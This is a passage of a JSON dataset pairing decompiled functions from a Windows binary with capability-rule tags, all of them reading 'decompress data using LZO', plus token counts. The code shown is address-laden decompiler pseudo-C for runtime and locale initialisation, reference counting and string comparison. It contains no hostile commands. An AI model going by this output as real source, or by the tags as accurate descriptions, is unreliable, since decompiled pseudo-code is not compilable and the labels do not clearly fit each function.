return;\n}\n",
        "token_count": 2650
    },
    "004ad350": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004ad350(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    int32_t iVar14;\n    int32_t **ppiVar15;\n    ulong uVar16;\n    \n    if (param_3 == 0) {\n        return;\n    }\n    uVar7 = fcn.00451af0();\n    if (*(param_1 + 8) - 1U < uVar7) {\n        uVar11 = uVar7 + 4;\n        iVar3 = *(param_1 + 4);\n        iVar14 = uVar11 * 4;\n        if (0x1fffffff < uVar11) {\n            iVar14 = -1;\n        }\n        iVar8 = fcn.004c2c50(iVar14);\n        uVar4 = *(param_1 + 8);\n        if (uVar4 != 0) {\n            iVar5 = *(param_1 + 4);\n            uVar9 = 0;\n            do {\n                *(iVar8 + uVar9 * 4) = *(iVar5 + uVar9 * 4);\n                uVar9 = uVar9 + 1;\n            } while (uVar9 != uVar4);\n        }\n        if (uVar4 < uVar11) {\n            puVar10 = iVar8 + uVar4 * 4;\n            do {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            } while (iVar8 + 0x10 + uVar7 * 4 != puVar10);\n        }\n        iVar5 = *(param_1 + 0xc);\n        iVar14 = fcn.004c2c50(iVar14);\n        uVar4 = *(param_1 + 8);\n        if (uVar4 != 0) {\n            iVar6 = *(param_1 + 0xc);\n            uVar9 = 0;\n            do {\n                *(iVar14 + uVar9 * 4) = *(iVar6 + uVar9 * 4);\n                uVar9 = uVar9 + 1;\n            } while (uVar9 != uVar4);\n        }\n        if (uVar4 < uVar11) {\n            puVar10 = iVar14 + uVar4 * 4;\n            do {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            } while (puVar10 != iVar14 + 0x10 + uVar7 * 4);\n        }\n        *(param_1 + 4) = iVar8;\n        *(param_1 + 0xc) = iVar14;\n        *(param_1 + 8) = uVar11;\n        if (iVar3 != 0) {\n            fcn.004c2c20(iVar3);\n        }\n        if (iVar5 != 0) {\n            fcn.004c2c20(iVar5);\n        }\n    }\n    if (*0x515a34 == 0) {\n        *(param_3 + 4) = *(param_3 + 4) + 1;\n    }\n    else {\n        LOCK();\n        *(param_3 + 4) = *(param_3 + 4) + 1;\n    }\n    ppiVar2 = *(param_1 + 4) + uVar7 * 4;\n    piVar12 = *ppiVar2;\n    if (piVar12 == NULL) goto code_r0x004ad54b;\n    if (*0x527c60 == 0) {\ncode_r0x004ad52b:\n        if (*0x515a34 == 0) goto code_r0x004ad539;\ncode_r0x004ad5d0:\n        LOCK();\n        piVar1 = piVar12 + 1;\n        iVar14 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    else {\n        do {\n            uVar11 = fcn.00451af0();\n            if (uVar11 == uVar7) {\n                iVar14 = *(param_1 + 4);\n                uVar16 = fcn.00451af0();\n                ppiVar15 = iVar14 + uVar16 * 4;\n                if (*ppiVar15 != NULL) {\n                    piVar12 = fcn.00452ac0(*((uVar16 >> 0x20) + 4));\n                    if (*0x515a34 == 0) {\n                        piVar12[1] = piVar12[1] + 1;\n                        piVar13 = *ppiVar15;\ncode_r0x004ad515:\n                        iVar14 = piVar13[1];\n                        piVar13[1] = iVar14 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar12[1] = piVar12[1] + 1;\n                        piVar13 = *ppiVar15;\n                        piVar1 = piVar13 + 1;\n                        if (*0x515a34 == 0) goto code_r0x004ad515;\n                        LOCK();\n                        iVar14 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar14 == 1) {\n                        (**(*piVar13 + 4))();\n                    }\ncode_r0x004ad527:\n                    *ppiVar15 = piVar12;\n                    piVar12 = *ppiVar2;\n                    goto code_r0x004ad52b;\n                }\n                break;\n            }\n            uVar16 = fcn.00451af0();\n            if (uVar16 == uVar7) {\n                iVar14 = *(param_1 + 4);\n                uVar16 = fcn.00451af0();\n                ppiVar15 = iVar14 + uVar16 * 4;\n                if (*ppiVar15 != NULL) {\n                    piVar12 = fcn.00452130(*(uVar16 >> 0x20));\n                    if (*0x515a34 == 0) {\n                        piVar12[1] = piVar12[1] + 1;\n                        piVar13 = *ppiVar15;\ncode_r0x004ad635:\n                        iVar14 = piVar13[1];\n                        piVar13[1] = iVar14 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar12[1] = piVar12[1] + 1;\n                        piVar13 = *ppiVar15;\n                        piVar1 = piVar13 + 1;\n                        if (*0x515a34 == 0) goto code_r0x004ad635;\n                        LOCK();\n                        iVar14 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar14 == 1) {\n                        (**(*piVar13 + 4))();\n                    }\n                    goto code_r0x004ad527;\n                }\n                break;\n            }\n        } while (*((uVar16 >> 0x20) + 8) != 0);\n        piVar12 = *ppiVar2;\n        if (*0x515a34 != 0) goto code_r0x004ad5d0;\ncode_r0x004ad539:\n        iVar14 = piVar12[1];\n        piVar12[1] = iVar14 + -1;\n    }\n    if (iVar14 == 1) {\n        (**(*piVar12 + 4))();\n    }\ncode_r0x004ad54b:\n    iVar14 = *(param_1 + 8);\n    *ppiVar2 = param_2;\n    if (iVar14 != 0) {\n        uVar7 = 0;\n        iVar14 = *(param_1 + 0xc);\n        do {\n            piVar12 = *(iVar14 + uVar7 * 4);\n            if (piVar12 != NULL) {\n                if (*0x515a34 == 0) {\n                    iVar14 = piVar12[1];\n                    piVar12[1] = iVar14 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = piVar12 + 1;\n                    iVar14 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar14 == 1) {\n                    (**(*piVar12 + 4))();\n                }\n                iVar14 = *(param_1 + 0xc);\n                *(iVar14 + uVar7 * 4) = 0;\n            }\n            uVar7 = uVar7 + 1;\n        } while (uVar7 <= *(param_1 + 8) && *(param_1 + 8) != uVar7);\n    }\n    return;\n}\n",
        "token_count": 2003
    },
    "004ad8e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.004ad8e0(uint arg_8h)\n\n{\n    uint *puVar1;\n    ushort *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_bp_8h;\n    \n    in_ECX[2] = 0x2e;\n    *in_ECX = arg_8h;\n    puVar1 = 0x516800;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 != 0x5168b8);\n    in_ECX[1] = 0x516800;\n    puVar1 = 0x516700;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 != 0x5167b8);\n    in_ECX[3] = 0x516700;\n    puVar1 = 0x5166e4;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 != 0x5166fc);\n    in_ECX[4] = 0x5166e4;\n    *0x5166e4 = 0x5161c0;\n    puVar2 = fcn.004ae930();\n    *0x5161c0 = *puVar2;\n    fcn.004abfb0(0, 0, 1);\n    fcn.004ad350(0x516f00, 0x5161e0);\n    fcn.004b8f30(1);\n    fcn.004ad350(0x516f70, 0x5167c0);\n    *0x515d44 = 1;\n    *0x515d64 = 0;\n    *0x515d40 = 0x52c530;\n    *0x515d48 = 0;\n    *0x515d4c = 0;\n    *0x515d50 = 0;\n    *0x515d54 = 0;\n    *0x515d58 = 0;\n    *0x515d5c = 0;\n    *0x515d60 = 0;\n    *0x515da4 = 0;\n    *0x515c44 = 1;\n    *0x515c40 = 0x52bd00;\n    *0x515c48 = 0x515d40;\n    fcn.004b8520(0);\n    fcn.004ad350(0x516f48, 0x515c40);\n    *0x5168c4 = 1;\n    *0x5168c0 = 0x52cae8;\n    fcn.004ad350(0x516f80, 0x5168c0);\n    *0x5168d4 = 1;\n    *0x5168d0 = 0x52cb60;\n    fcn.004ad350(0x516f88, 0x5168d0);\n    *0x5167dc = 1;\n    *0x5167d8 = 0x52bc90;\n    *0x5167e0 = fcn.004ae940();\n    fcn.004ad350(0x516f38, 0x5167d8);\n    *0x516040 = 0x52c654;\n    *0x516044 = 1;\n    *0x516048 = 0;\n    *0x51604c = 0;\n    *0x516050 = 0;\n    *0x516052 = 0;\n    *0x516054 = 0;\n    *0x516058 = 0;\n    *0x51605c = 0;\n    *0x516060 = 0;\n    *0x516064 = 0;\n    *0x516068 = 0;\n    *0x51606c = 0;\n    *0x516070 = 0;\n    *0x516074 = 0;\n    *0x516083 = 0;\n    *0x515cec = 1;\n    *0x515ce8 = 0x52b9e0;\n    *0x515cf0 = 0x516040;\n    fcn.004aede0(0, 0);\n    fcn.004ad350(0x516f28, 0x515ce8);\n    *0x5160a0 = 0x52c664;\n    *0x5160a4 = 1;\n    *0x5160a8 = 0;\n    *0x5160ac = 0;\n    *0x5160b0 = 0;\n    *0x5160b2 = 0;\n    *0x5160b4 = 0;\n    *0x5160b8 = 0;\n    *0x5160bc = 0;\n    *0x5160c0 = 0;\n    *0x5160c4 = 0;\n    *0x5160c8 = 0;\n    *0x5160cc = 0;\n    *0x5160d0 = 0;\n    *0x5160d4 = 0;\n    *0x5160e3 = 0;\n    *0x515cf8 = 1;\n    *0x515cf4 = 0x52ba14;\n    *0x515cfc = 0x5160a0;\n    fcn.004af1c0(0, 0);\n    fcn.004ad350(0x516f2c, 0x515cf4);\n    *0x515c8c = 1;\n    *0x515c88 = 0x52bda0;\n    fcn.004ad350(0x516f58, 0x515c88);\n    *0x515c9c = 1;\n    *0x515c98 = 0x52bdd0;\n    fcn.004ad350(0x516f60, 0x515c98);\n    *0x515e84 = 1;\n    *0x515e80 = 0x52c564;\n    *0x515e88 = 0;\n    *0x515e8c = 0;\n    *0x515e90 = 0;\n    *0x515e94 = 0;\n    *0x515e98 = 0;\n    *0x515e9c = 0;\n    *0x515ea0 = 0;\n    *0x515ea4 = 0;\n    *0x515ea8 = 0;\n    *0x515eac = 0;\n    *0x515eb0 = 0;\n    *0x515eb4 = 0;\n    *0x515eb8 = 0;\n    *0x515ebc = 0;\n    *0x515ec0 = 0;\n    *0x515ec4 = 0;\n    *0x515ec8 = 0;\n    *0x515ecc = 0;\n    *0x515ed0 = 0;\n    *0x515ed4 = 0;\n    *0x515ed8 = 0;\n    *0x515edc = 0;\n    *0x515ee0 = 0;\n    *0x515ee4 = 0;\n    *0x515ee8 = 0;\n    *0x515eec = 0;\n    *0x515ef0 = 0;\n    *0x515ef4 = 0;\n    *0x515ef8 = 0;\n    *0x515efc = 0;\n    *0x515f00 = 0;\n    *0x515f04 = 0;\n    *0x515f08 = 0;\n    *0x515f0c = 0;\n    *0x515f10 = 0;\n    *0x515f14 = 0;\n    *0x515f18 = 0;\n    *0x515f1c = 0;\n    *0x515f20 = 0;\n    *0x515f24 = 0;\n    *0x515f28 = 0;\n    *0x515f2c = 0;\n    *0x515f30 = 0;\n    *0x515f34 = 0;\n    *0x515f38 = 0;\n    *0x515f3c = 0;\n    *0x515f40 = 0;\n    *0x515f44 = 0;\n    fcn.0048ea80(0x515e80, 1);\n    fcn.004ad350(0x516dbc, 0x515ca8);\n    *0x515c5c = 1;\n    *0x515c58 = 0x52bd48;\n    fcn.004ad350(0x516f50, 0x515c58);\n    *0x515c6c = 1;\n    *0x515c68 = 0x52ccb4;\n    fcn.004ad350(0x516fb0, 0x515c68);\n    fcn.004b8240(1);\n    fcn.004ad350(0x516f40, 0x515c20);\n    fcn.004ac240(1);\n    fcn.004ad350(0x516f04, 0x516400);\n    fcn.004b9010(1);\n    fcn.004ad350(0x516f74, 0x5167cc);\n    *0x515dc4 = 1;\n    *0x515dc0 = 0x52c540;\n    *0x515dc8 = 0;\n    *0x515dcc = 0;\n    *0x515dd0 = 0;\n    *0x515dd4 = 0;\n    *0x515dd8 = 0;\n    *0x515ddc = 0;\n    *0x515de0 = 0;\n    *0x515de4 = 0;\n    *0x515e64 = 0;\n    *0x515c50 = 1;\n    *0x515c4c = 0x52bd24;\n    *0x515c54 = 0x515dc0;\n    fcn.004b8870(0);\n    fcn.004ad350(0x516f4c, 0x515c4c);\n    *0x5168cc = 1;\n    *0x5168c8 = 0x52cb24;\n    fcn.004ad350(0x516f84, 0x5168c8);\n    *0x5168dc = 1;\n    *0x5168d8 = 0x52cb90;\n    fcn.004ad350(0x516f8c, 0x5168d8);\n    *0x5167e8 = 1;\n    *0x5167e4 = 0x52bcac;\n    *0x5167ec = fcn.004ae940();\n    fcn.004ad350(0x516f3c, 0x5167e4);\n    *0x516104 = 1;\n    *0x516100 = 0x52c674;\n    *0x516108 = 0;\n    *0x51610c = 0;\n    *0x516110 = 0;\n    *0x516112 = 0;\n    *0x516118 = 0;\n    *0x51611c = 0;\n    *0x516120 = 0;\n    *0x516124 = 0;\n    *0x516128 = 0;\n    *0x51612c = 0;\n    *0x516130 = 0;\n    *0x516134 = 0;\n    *0x516138 = 0;\n    *0x516152 = 0;\n    *0x515d04 = 1;\n    *0x515d00 = 0x52ba48;\n    *0x515d08 = 0x516100;\n    fcn.004af5a0(0, 0);\n    fcn.004ad350(0x516f30, 0x515d00);\n    *0x516164 = 1;\n    *0x516160 = 0x52c684;\n    *0x516168 = 0;\n    *0x51616c = 0;\n    *0x516170 = 0;\n    *0x516172 = 0;\n    *0x516178 = 0;\n    *0x51617c = 0;\n    *0x516180 = 0;\n    *0x516184 = 0;\n    *0x516188 = 0;\n    *0x51618c = 0;\n    *0x516190 = 0;\n    *0x516194 = 0;\n    *0x516198 = 0;\n    *0x5161b2 = 0;\n    *0x515d10 = 1;\n    *0x515d0c = 0x52ba7c;\n    *0x515d14 = 0x516160;\n    fcn.004af990(0, 0);\n    fcn.004ad350(0x516f34, 0x515d0c);\n    *0x515c94 = 1;\n    *0x515c90 = 0x52bdb8;\n    fcn.004ad350(0x516f5c, 0x515c90);\n    *0x515ca4 = 1;\n    *0x515ca0 = 0x52bde8;\n    fcn.004ad350(0x516f64, 0x515ca0);\n    *0x515f64 = 1;\n    *0x515f60 = 0x52c574;\n    *0x515f68 = 0;\n    *0x515f6c = 0;\n    *0x515f70 = 0;\n    *0x515f74 = 0;\n    *0x515f78 = 0;\n    *0x515f7c = 0;\n    *0x515f80 = 0;\n    *0x515f84 = 0;\n    *0x515f88 = 0;\n    *0x515f8c = 0;\n    *0x515f90 = 0;\n    *0x515f94 = 0;\n    *0x515f98 = 0;\n    *0x515f9c = 0;\n    *0x515fa0 = 0;\n    *0x515fa4 = 0;\n    *0x515fa8 = 0;\n    *0x515fac = 0;\n    *0x515fb0 = 0;\n    *0x515fb4 = 0;\n    *0x515fb8 = 0;\n    *0x515fbc = 0;\n    *0x515fc0 = 0;\n    *0x515fc4 = 0;\n    *0x515fc8 = 0;\n    *0x515fcc = 0;\n    *0x515fd0 = 0;\n    *0x515fd4 = 0;\n    *0x515fd8 = 0;\n    *0x515fdc = 0;\n    *0x515fe0 = 0;\n    *0x515fe4 = 0;\n    *0x515fe8 = 0;\n    *0x515fec = 0;\n    *0x515ff0 = 0;\n    *0x515ff4 = 0;\n    *0x515ff8 = 0;\n    *0x515ffc = 0;\n    *0x516000 = 0;\n    *0x516004 = 0;\n    *0x516008 = 0;\n    *0x51600c = 0;\n    *0x516010 = 0;\n    *0x516014 = 0;\n    *0x516018 = 0;\n    *0x51601c = 0;\n    *0x516020 = 0;\n    *0x516024 = 0;\n    fcn.0048f1c0(0x515f60, 1);\n    fcn.004ad350(0x516dc0, 0x515cbc);\n    *0x515c64 = 1;\n    *0x515c60 = 0x52bd74;\n    fcn.004ad350(0x516f54, 0x515c60);\n    *0x515c74 = 1;\n    *0x515c70 = 0x52ccc8;\n    fcn.004ad350(0x516fb4, 0x515c70);\n    fcn.004b83d0(1);\n    fcn.004ad350(0x516f44, 0x515c30);\n    *0x515c7c = 1;\n    *0x515c78 = vtable.0H.0;\n    fcn.004ad350(0x516f6c, 0x515c78);\n    *0x515c84 = 1;\n    *0x515c80 = 0x52ca00;\n    fcn.004ad350(0x516f68, 0x515c80);\n    var_20h = 0x515d40;\n    var_1ch = 0x516040;\n    var_18h = 0x5160a0;\n    var_14h = 0x515dc0;\n    var_10h = 0x516100;\n    var_ch = 0x516160;\n    fcn.004ac3d0(&var_20h);\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00451af0();\n    *(iVar5 + iVar3 * 4) = 0x515d40;\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00451af0();\n    *(iVar5 + iVar3 * 4) = 0x516040;\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00451af0();\n    *(iVar5 + iVar3 * 4) = 0x5160a0;\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00451af0();\n    *(iVar5 + iVar3 * 4) = 0x515e80;\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00451af0();\n    *(iVar5 + iVar3 * 4) = 0x515dc0;\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00451af0();\n    *(iVar5 + iVar3 * 4) = 0x516100;\n    iVar5 = in_ECX[3];\n    iVar4 = fcn.00451af0();\n    iVar3 = in_ECX[3];\n    *(iVar5 + iVar4 * 4) = 0x516160;\n    iVar5 = fcn.00451af0();\n    *(iVar3 + iVar5 * 4) = 0x515f60;\n    return;\n}\n",
        "token_count": 4407
    },
    "004aea70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004aea70(uint arg_8h, int32_t **arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    code *unaff_EBX;\n    uint uVar5;\n    ulong uVar6;\n    uchar auStack65 [9];\n    uint var_34h;\n    uint *var_30h;\n    uint var_28h;\n    uint uStack32;\n    code *var_ch;\n    \n    var_ch = unaff_EBX;\n    fcn.004ac2f0();\n    var_34h = fcn.00448140();\n    if (*0x515a34 == 0) {\n        piVar1 = *arg_ch;\n    }\n    else {\n        iVar2 = fcn.004382e0(var_34h);\n        if (iVar2 != 0) {\n            uVar4 = fcn.00449d10();\n            fcn.004485f0();\n            uVar5 = uVar4;\n            do {\n                uVar6 = fcn.0043a8e0(uVar5);\n                uVar5 = uVar6;\n            } while (uVar6 >> 0x20 != -1);\n            fcn.004c2f10();\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(arg_8h);\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(uVar4);\n            fcn.004c2c30();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(uVar4);\n            fcn.004c2c30();\n            fcn.0043a8e0(uVar4);\n            fcn.0048b630(&uStack32 + 3);\n            fcn.0043a8e0(arg_8h);\n            if (uStack32 != NULL) {\n                (*uStack32)(arg_8h);\n            }\n            fcn.0043a8e0(uVar4);\n            if (uStack32 != NULL) {\n                (*uStack32)(arg_8h);\n            }\n            fcn.0043a8e0(uVar4);\n            if (var_ch != NULL) {\n                (*var_ch)(arg_8h);\n            }\n            fcn.0043a8e0(uVar4);\n            if (var_ch != NULL) {\n                (*var_ch)(arg_8h);\n            }\n            fcn.0043a8e0(uVar4);\n            if (var_ch != NULL) {\n                (*var_ch)(arg_8h);\n            }\n            fcn.0043a8e0(uVar4);\n            if (var_ch != NULL) {\n                (*var_ch)(arg_8h);\n            }\n            fcn.0043a8e0(uVar4);\n            fcn.0048b630(auStack65);\n            if (uStack32 != NULL) {\n                (*uStack32)(uVar4);\n            }\n            fcn.0043a8e0(arg_8h);\n            fcn.00483770(auStack65);\n            if (uStack32 != NULL) {\n                (*uStack32)();\n            }\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(arg_8h);\n            fcn.004aea60();\n            do {\n                fcn.004c2c30(uVar4);\n                fcn.0043a8e0(arg_8h);\n                fcn.004c2c30(uVar4);\n                fcn.0043a8e0(arg_8h);\n                fcn.00453450();\n                fcn.0048df30();\n            } while( true );\n        }\n        piVar1 = *arg_ch;\n        if (*0x515a34 != 0) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            piVar1 = *arg_ch;\n            uVar5 = *0x516f24;\n            goto code_r0x004aeaa1;\n        }\n    }\n    *piVar1 = *piVar1 + 1;\n    uVar5 = *0x516f24;\ncode_r0x004aeaa1:\n    *0x516f24 = piVar1;\n    fcn.00451b30(arg_ch);\n    iVar2 = fcn.00454fe0(0x5237ba);\n    if (iVar2 != 0) goto code_r0x004aeb70;\n    while( true ) {\n        if (var_30h != &var_28h) {\n            fcn.004c2c30(var_30h);\n        }\n        if (*0x515a34 == 0) break;\n        iVar2 = fcn.00438340(var_34h);\n        if (iVar2 == 0) break;\n        puVar3 = fcn.004c2d80(4);\n        *puVar3 = 0x52b51c;\n        fcn.004c3330(puVar3, 0x528194, 0x449b10);\ncode_r0x004aeb70:\n        sub.msvcrt.dll_setlocale(0, var_30h);\n    }\n    fcn.004aebd0(uVar5);\n    return arg_8h;\n}\n",
        "token_count": 2184
    },
    "004b05a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004b05a0(void)\n\n{\n    fcn.004b1bc0(0);\n    return;\n}\n",
        "token_count": 29
    },
    "004b3310": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004b3310(void)\n\n{\n    fcn.004b4a30(0);\n    return;\n}\n",
        "token_count": 28
    },
    "004b66c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004b66c0(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x52bd00;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.004b8520();\n    *in_ECX = 0x52bb20;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x523d3d;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x523d3f;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.004ae9c0();\n            fcn.004b8520();\n            fcn.004aea30(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 584
    },
    "004b6890": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004b6890(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x52bd00;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.004b8520();\n    *in_ECX = 0x52bb20;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x523d3d;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x523d3f;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.004ae9c0();\n            fcn.004b8520();\n            fcn.004aea30(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 583
    },
    "004b6aa0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004b6aa0(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x52bd24;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.004b8870();\n    *in_ECX = 0x52bb44;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x523ff9;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while 